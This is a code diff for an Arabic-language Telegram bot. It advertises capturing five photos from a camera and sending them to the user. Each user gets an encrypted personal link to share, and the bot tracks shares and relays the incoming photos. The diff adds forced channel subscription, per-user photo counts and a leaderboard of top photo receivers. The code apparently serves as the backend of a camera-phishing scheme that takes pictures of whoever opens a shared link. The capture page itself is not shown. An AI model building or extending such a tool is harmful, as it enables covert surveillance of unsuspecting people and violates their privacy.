@@ -13,13 +13,14 @@ from encryption import encrypt_id
 
 bot = telebot.TeleBot(TOKEN)
 
-# معرف القناة المطلوب الاشتراك فيها (مع الـ @)
-REQUIRED_CHANNEL = "@KhaldounSoft"
-CHANNEL_LINK = "https://t.me/KhaldounSoft"
+# معرف ورابط القناة للإشتراك الإجباري
+CHANNEL_USERNAME = "@KhaldounSoft"
+CHANNEL_URL = "https://t.me/KhaldounSoft"
 
 # تحميل البيانات
 data = load_data()
 user_stats = data.get("user_stats", {})
+total_photos_received = data.get("total_photos_received", 0)
 
 # تحديث وقت بدء البوت إذا كان أول مرة
 if not data.get("first_start"):
@@ -35,6 +36,35 @@ last_profile_update = {'last_update': 0}
 # تخزين أوامر المستخدمين للحد من السرعة
 user_commands = defaultdict(list)
 
+def check_subscription(user_id):
+    """التحقق مما إذا كان المستخدم مشتركاً في القناة"""
+    if user_id == DEVELOPER_CHAT_ID:
+        return True
+    try:
+        member = bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
+        if member.status in ['creator', 'administrator', 'member']:
+            return True
+        return False
+    except Exception as e:
+        logger.error(f"خطأ في التحقق من الاشتراك للمستخدم {user_id}: {e}")
+        return True
+
+def send_subscription_request(chat_id):
+    """إرسال رسالة تطلب من المستخدم الاشتراك في القناة"""
+    markup = InlineKeyboardMarkup()
+    sub_button = InlineKeyboardButton(text="📢 اشترك في القناة", url=CHANNEL_URL)
+    check_button = InlineKeyboardButton(text="✅ تحقق من الاشتراك", callback_data="check_subscription")
+    markup.add(sub_button)
+    markup.add(check_button)
+
+    message_text = (
+        "⚠️ **عذراً، يجب عليك الاشتراك في قناة البوت أولاً لاستخدامه!**\n\n"
+        "📢 **القناة:** عالم البرمجيات | Software World\n"
+        f"🔗 **الرابط:** {CHANNEL_URL}\n\n"
+        "بعد الاشتراك، اضغط على زر **«تحقق من الاشتراك»** بالأسفل للبدء."
+    )
+    bot.send_message(chat_id, message_text, parse_mode="Markdown", reply_markup=markup)
+
 def parse_date(date_value):
     """تحويل التاريخ من نص إلى كائن datetime"""
     if isinstance(date_value, str):
@@ -42,43 +72,13 @@ def parse_date(date_value):
     return date_value
 
 def rate_limit(user_id, limit=5, period=60):
-    """التحقق من عدم تجاوز حد الأوامر (5 أوامر في الدقيقة افتراضياً)"""
+    """التحقق من عدم تجاوز حد الأوامر"""
     now = datetime.now()
     user_commands[user_id] = [t for t in user_commands[user_id] if now - t < timedelta(seconds=period)]
-    
     if len(user_commands[user_id]) >= limit:
         return False
-    
     user_commands[user_id].append(now)
     return True
-
-def check_subscription(user_id):
-    """التحقق من اشتراك المستخدم في القناة المطلوبة"""
-    # استثناء المطور من التحقق
-    if user_id == DEVELOPER_CHAT_ID:
-        return True
-    try:
-        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
-        if member.status in ['creator', 'administrator', 'member']:
-            return True
-        return False
-    except Exception as e:
-        logger.error(f"Error checking subscription for {user_id}: {e}")
-        # في حال وجود خطأ في الصلاحيات أو عدم رفع البوت كأدمن بالقناة، سيتم السماح لتجنب تعطيل البوت
-        return True
-
-def send_subscription_message(chat_id):
-    """إرسال رسالة طلب الاشتراك بالقناة"""
-    markup = InlineKeyboardMarkup(row_width=1)
-    btn_channel = InlineKeyboardButton(text="📢 عالم البرمجيات | Software World", url=CHANNEL_LINK)
-    btn_check = InlineKeyboardButton(text="🔄 تحقق من الاشتراك", callback_data="check_sub")
-    markup.add(btn_channel, btn_check)
-    
-    msg_text = (
-        "⚠️ *عذراً، يجب عليك الاشتراك في قناة البوت لاستخدامه!*\n\n"
-        "اشترك في القناة ثم اضغط على زر *\"تحقق من الاشتراك\"* للبدء."
-    )
-    bot.send_message(chat_id, msg_text, parse_mode="Markdown", reply_markup=markup)
 
 def backup_data():
     """إنشاء نسخة احتياطية تلقائية للبيانات"""
@@ -88,7 +88,6 @@ def backup_data():
         shutil.copy('data.json', backup_file)
         logger.info(f"Backup created: {backup_file}")
         
-        # الاحتفاظ بآخر 10 نسخ فقط
         backups = sorted(glob.glob('backup_*.json'))
         for old_backup in backups[:-10]:
             os.remove(old_backup)
@@ -100,20 +99,19 @@ def save_user_data():
     """حفظ بيانات المستخدمين مع قفل لمنع التزاحم"""
     with data_lock:
         data["user_stats"] = user_stats
+        data["total_photos_received"] = total_photos_received
         data["total_users"] = len(user_stats)
         save_data(data)
 
 def setup_bot_commands():
-    """إعداد قائمة الأوامر التي تظهر في مربع الكتابة"""
+    """إعداد قائمة الأوامر"""
     try:
         bot.delete_my_commands()
-        
         general_commands = [
             BotCommand("start", "🚀 بدء استخدام البوت"),
             BotCommand("stats", "📊 عرض إحصائياتك"),
             BotCommand("help", "❓ المساعدة والتعليمات")
         ]
-        
         bot.set_my_commands(general_commands, scope=BotCommandScopeDefault())
         
         if DEVELOPER_CHAT_ID:
@@ -124,7 +122,6 @@ def setup_bot_commands():
                 BotCommand("exportdata", "📤 تصدير البيانات"),
                 BotCommand("health", "🏥 حالة البوت")
             ]
-            
             bot.set_my_commands(developer_commands, scope=BotCommandScopeChat(chat_id=DEVELOPER_CHAT_ID))
         
         logger.info("Bot commands setup completed")
@@ -132,25 +129,22 @@ def setup_bot_commands():
         logger.error(f"Failed to setup bot commands: {e}")
 
 def update_bot_profile(force=False):
-    """تحديث اسم البوت ووصفه مع عدد المستخدمين"""
+    """تحديث اسم البوت ووصفه"""
     current_time = time.time()
-    
     if not force and current_time - last_profile_update.get('last_update', 0) < 300:
         return
     
     try:
         total_users = len(user_stats)
-        
         bot.set_my_description(
             f"📸 بوت الكاميرا الذكية\n"
-            f"👥 عدد المستخدمين: {total_users}\n\n"
+            f"👥 عدد المستخدمين: {total_users}\n"
+            f"🖼️ اجمالي الصور: {total_photos_received}\n\n"
             f"✨ بوت متخصص بالتقاط 5 صور من الكاميرا وإرسالها إليك"
         )
-        
         bot.set_my_short_description(
             f"📸 بوت الكاميرا الذكية | {total_users} مستخدم"
         )
-        
         last_profile_update['last_update'] = current_time
         logger.info(f"Bot profile updated - Users: {total_users}")
     except Exception as e:
@@ -163,19 +157,34 @@ def notify_developer(message_text, parse_mode="Markdown"):
     except Exception as e:
         logger.error(f"Failed to notify developer: {e}")
 
+@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
+def handle_check_subscription(call):
+    """معالجة الضغط على زر التحقق من الاشتراك"""
+    user_id = call.from_user.id
+    if check_subscription(user_id):
+        bot.answer_callback_query(call.id, "✅ شكرًا لاشتراكك! يمكنك الآن استخدام البوت.")
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except Exception:
+            pass
+        send_welcome(call.message)
+    else:
+        bot.answer_callback_query(call.id, "❌ لم تشترك في القناة بعد! يرجى الاشتراك أولاً.", show_alert=True)
+
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     """رسالة الترحيب"""
     user_id = message.chat.id
 
+    # التحقق من الاشتراك أولاً
     if not check_subscription(user_id):
-        send_subscription_message(user_id)
+        send_subscription_request(user_id)
         return
 
     if not rate_limit(user_id):
         bot.reply_to(message, "⏰ أنت ترسل الأوامر بسرعة كبيرة، انتظر قليلاً")
         return
-    
+
     user_name = message.from_user.first_name
     username = message.from_user.username or "لا يوجد"
     is_new_user = False
@@ -185,6 +194,7 @@ def send_welcome(message):
         user_stats[user_id] = {
             "name": user_name,
             "username": username,
+            "photo_count": 0,
             "first_seen": datetime.now().isoformat(),
             "last_active": datetime.now().isoformat(),
             "total_links_shared": 0
@@ -242,33 +252,16 @@ def send_welcome(message):
     bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
     logger.info(f"User started: {user_name} (ID: {user_id}) - New: {is_new_user}")
 
-@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
-def callback_check_sub(call):
-    """التحقق عند اضغط على زر التحقق من الاشتراك"""
-    user_id = call.message.chat.id
-    if check_subscription(user_id):
-        bot.answer_callback_query(call.id, "✅ شكراً لاشتراكك! يمكنك الآن استخدام البوت.")
-        bot.delete_message(call.message.chat.id, call.message.message_id)
-        send_welcome(call.message)
-    else:
-        bot.answer_callback_query(call.id, "❌ لم تشترك في القناة بعد! يرجى الاشتراك أولاً.", show_alert=True)
-
 @bot.callback_query_handler(func=lambda call: call.data.startswith("copy_"))
 def copy_link(call):
     """نسخ الرابط عند الضغط على الزر"""
-    if not check_subscription(call.message.chat.id):
-        send_subscription_message(call.message.chat.id)
-        return
-
     try:
         encrypted = call.data.replace("copy_", "")
         if not encrypted:
             raise ValueError("Empty encrypted data")
         
         personal_link = f"{BASE_URL}?q={encrypted}"
-        
         bot.answer_callback_query(call.id, "📋 تم نسخ الرابط بنجاح!")
-        
         bot.send_message(
             call.message.chat.id,
             f"📋 *رابطك الشخصي:*\n"
@@ -284,8 +277,9 @@ def copy_link(call):
 def show_stats(message):
     """عرض الإحصائيات"""
     user_id = message.chat.id
+
     if not check_subscription(user_id):
-        send_subscription_message(user_id)
+        send_subscription_request(user_id)
         return
 
     if not rate_limit(user_id):
@@ -302,11 +296,13 @@ def show_stats(message):
             f"📊 *إحصائياتك الشخصية*\n\n"
             f"👤 الاسم: {stat['name']}\n"
             f"🆔 رقمك: `{user_id}`\n"
+            f"📸 عدد الصور المستلمة: {stat['photo_count']}\n"
             f"🔗 عدد مرات مشاركة رابطك: {stat.get('total_links_shared', 0)}\n"
             f"📅 تاريخ التسجيل: {first_seen.strftime('%Y-%m-%d %H:%M')}\n"
             f"🕐 آخر نشاط: {last_active.strftime('%Y-%m-%d %H:%M')}\n\n"
             f"🌐 *إحصائيات عامة:*\n"
-            f"👥 عدد مستخدمي البوت: {total_users}"
+            f"👥 عدد مستخدمي البوت: {total_users}\n"
+            f"🖼️ إجمالي الصور: {total_photos_received}"
         )
     else:
         response = "❌ لم يتم العثور على إحصائيات لك. استخدم /start أولاً"
@@ -320,6 +316,7 @@ def admin_stats(message):
         return
     
     total_users = len(user_stats)
+    total_photos = total_photos_received
     
     today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
     week_ago = (datetime.now() - timedelta(days=7)).replace(hour=0, minute=0, second=0, microsecond=0)
@@ -333,6 +330,11 @@ def admin_stats(message):
             active_today += 1
         if last_active > week_ago:
             active_week += 1
+    
+    top_users = sorted(user_stats.items(), key=lambda x: x[1].get('photo_count', 0), reverse=True)[:5]
+    top_users_text = ""
+    for i, (uid, stat) in enumerate(top_users, 1):
+        top_users_text += f"{i}. {stat['name']} - {stat.get('photo_count', 0)} صورة\n"
     
     first_start = parse_date(data.get("first_start", datetime.now().isoformat()))
     
@@ -353,8 +355,10 @@ def admin_stats(message):
     response = (
         f"📊 *إحصائيات البوت الكاملة*\n\n"
         f"👥 *إجمالي المستخدمين:* {total_users}\n"
+        f"🖼️ *إجمالي الصور:* {total_photos}\n"
         f"⭐ *المستخدمين النشطين اليوم:* {active_today}\n"
         f"📅 *المستخدمين النشطين آخر 7 أيام:* {active_week}\n\n"
+        f"🏆 *أكثر المستخدمين نشاطاً:*\n{top_users_text}\n"
         f"📅 *تاريخ بدء البوت:* {first_start.strftime('%Y-%m-%d %H:%M')}\n"
         f"🕐 *آخر تحديث:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
         f"{commands_list}"
@@ -363,7 +367,7 @@ def admin_stats(message):
 
 @bot.message_handler(commands=['userslist'])
 def users_list(message):
-    """عرض قائمة المستخدمين مع ترقيم الصفحات (للمطور فقط)"""
+    """عرض قائمة المستخدمين (للمطور فقط)"""
     if message.chat.id != DEVELOPER_CHAT_ID:
         bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
         return
@@ -375,7 +379,6 @@ def users_list(message):
     show_users_page(message, 0)
 
 def show_users_page(message, page):
-    """عرض صفحة محددة من قائمة المستخدمين"""
     PAGE_SIZE = 20
     users_list = list(user_stats.items())
     total_pages = (len(users_list) + PAGE_SIZE - 1) // PAGE_SIZE
@@ -391,7 +394,7 @@ def show_users_page(message, page):
     for uid, stat in users_list[start_idx:end_idx]:
         last_active = parse_date(stat['last_active'])
         users_text += f"• {stat['name']} (@{stat['username']})\n"
-        users_text += f"  🆔 `{uid}` | 🕐 {last_active.strftime('%Y-%m-%d')}\n\n"
+        users_text += f"   🆔 `{uid}` | 📸 {stat['photo_count']} | 🕐 {last_active.strftime('%Y-%m-%d')}\n\n"
     
     markup = InlineKeyboardMarkup(row_width=2)
     nav_buttons = []
@@ -447,9 +450,11 @@ def set_bot_photo(message):
 
 @bot.message_handler(commands=['help'])
 def send_help(message):
+    """رسالة المساعدة"""
     user_id = message.chat.id
+
     if not check_subscription(user_id):
-        send_subscription_message(user_id)
+        send_subscription_request(user_id)
         return
 
     if not rate_limit(user_id):
@@ -549,6 +554,7 @@ def health_check(message):
         f"🏥 *حالة البوت*\n\n"
         f"✅ *الحالة:* يعمل بشكل طبيعي\n"
         f"👥 *المستخدمين:* {len(user_stats)}\n"
+        f"🖼️ *الصور:* {total_photos_received}\n"
         f"⏱️ *مدة التشغيل:* {uptime_days} يوم, {uptime_hours} ساعة, {uptime_minutes} دقيقة\n"
         f"📅 *آخر تحديث:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     )
@@ -557,23 +563,30 @@ def health_check(message):
 
 @bot.message_handler(content_types=['photo'])
 def handle_photos(message):
-    """استلام صور النظام وإرسالها للمستخدم (دون تخزين إحصائيات صور)"""
+    """معالجة الصور الواردة"""
+    global total_photos_received
     user_id = message.chat.id
     user_name = message.from_user.first_name
     username = message.from_user.username or "لا يوجد"
 
     if user_id in user_stats:
+        user_stats[user_id]["photo_count"] += 1
         user_stats[user_id]["last_active"] = datetime.now().isoformat()
     else:
         user_stats[user_id] = {
             "name": user_name,
             "username": username,
+            "photo_count": 1,
             "first_seen": datetime.now().isoformat(),
             "last_active": datetime.now().isoformat(),
             "total_links_shared": 0
         }
+        save_user_data()
     
+    total_photos_received += 1
     save_user_data()
+    
+    update_bot_profile()
 
     photo = message.photo[-1]
     file_info = bot.get_file(photo.file_id)
@@ -584,7 +597,9 @@ def handle_photos(message):
         f"👤 من: {user_name}\n"
         f"🆔 المعرف: `{user_id}`\n"
         f"📝 اليوزر: @{username}\n"
-        f"📏 الحجم: {file_size:.1f} كيلوبايت"
+        f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
+        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
+        f"📊 الإجمالي الكلي: {total_photos_received}"
     )
     bot.reply_to(message, caption)
     logger.info(f"Received photo from {user_name} (ID: {user_id})")
@@ -599,6 +614,7 @@ def export_data(message):
         export_data_dict = {
             "export_date": datetime.now().isoformat(),
             "total_users": len(user_stats),
+            "total_photos": total_photos_received,
             "user_stats": user_stats,
             "first_start": data.get("first_start")
         }
@@ -613,10 +629,7 @@ def export_data(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
-    if not check_subscription(call.message.chat.id):
-        send_subscription_message(call.message.chat.id)
-        return
-
+    """معالجة الأزرار الأخرى"""
     try:
         if call.data == "help":
             help_msg = bot.send_message(call.message.chat.id, "جاري تحميل المساعدة...")
@@ -631,9 +644,11 @@ def handle_callback(call):
 
 @bot.message_handler(func=lambda message: True)
 def handle_all_messages(message):
+    """معالجة الرسائل الأخرى"""
     user_id = message.chat.id
+
     if not check_subscription(user_id):
-        send_subscription_message(user_id)
+        send_subscription_request(user_id)
         return
 
     if not rate_limit(user_id, limit=10, period=60):
@@ -646,9 +661,9 @@ def handle_all_messages(message):
         bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\n\nاستخدم /start للحصول على رابطك الشخصي.\n\nيمكنك أيضاً الضغط على القائمة (Menu) في مربع الكتابة لرؤية الأوامر المتاحة.")
 
 def get_bot():
-    return bot, user_stats
+    """إرجاع كائن البوت والإحصائيات"""
+    return bot, user_stats, total_photos_received
 
-# تشغيل البوت
 if __name__ == "__main__":
     setup_bot_commands()
     update_bot_profile(force=True)
